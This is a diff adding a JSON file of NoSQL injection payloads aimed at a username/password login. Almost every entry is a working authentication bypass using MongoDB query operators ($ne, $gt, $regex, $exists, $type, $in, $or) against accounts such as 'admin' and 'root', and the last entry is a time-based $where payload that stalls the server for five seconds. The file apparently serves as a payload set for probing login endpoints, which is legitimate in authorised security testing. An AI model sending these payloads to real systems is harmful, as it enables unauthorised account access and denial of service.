@@ -1,0 +1,41 @@
+{
+  "baseline_payload": {
+    "username": "xXbOgUsXx",
+    "password": "xXbOgUsXx"
+  },
+  "bypass_not_equal": {
+    "username": { "$ne": "xXbOgUsXx" },
+    "password": { "$ne": "xXbOgUsXx" }
+  },
+  "bypass_targeted_admin": {
+    "username": "admin",
+    "password": { "$gt": "" }
+  },
+  "bypass_regex_wildcard": {
+    "username": "alice",
+    "password": { "$regex": "^.*" }
+  },
+  "bypass_exists_check": {
+    "username": "admin",
+    "password": { "$exists": true }
+  },
+  "bypass_type_string": {
+    "username": "admin",
+    "password": { "$type": 2 }
+  },
+  "bypass_in_array": {
+    "username": { "$in": ["admin", "administrator", "root"] },
+    "password": { "$gt": "" }
+  },
+  "bypass_logical_or": {
+    "username": "admin",
+    "$or": [
+      { "password": "wrong_password" },
+      { "password": { "$ne": "also_wrong" } }
+    ]
+  },
+  "time_based_sleep": {
+    "username": { "$where": "var d=new Date();while(new Date()-d<5000);" },
+    "password": "fake"
+  }
+}
